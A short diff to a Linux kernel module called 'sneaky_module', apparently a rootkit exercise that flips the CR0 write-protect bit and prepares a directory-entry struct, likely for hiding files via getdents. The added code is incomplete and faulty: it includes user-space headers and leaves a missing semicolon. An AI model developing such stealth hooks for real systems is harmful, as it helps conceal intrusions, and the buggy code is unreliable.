@@ -8,6 +8,21 @@
 #include <linux/kallsyms.h>
 #include <asm/page.h>
 #include <asm/cacheflush.h>
+#include <sys/syscall.h>
+#include <sys/stat.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <dirent.h>
+//interpret linux Dirent correctly:
+struct linux_dirent {
+  u64 d_ino;
+  s64 d_off;
+  unsigned short d_reclen;
+  char d_name[BUFFLEN];
+}
+
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -99,7 +114,7 @@ static void exit_sneaky_module(void)
   write_cr0(read_cr0() | 0x10000);
 }  
 
-
+//allows renaming of cleanup and init functions
 module_init(initialize_sneaky_module);  // what's called upon loading 
 module_exit(exit_sneaky_module);        // what's called upon unloading  
 
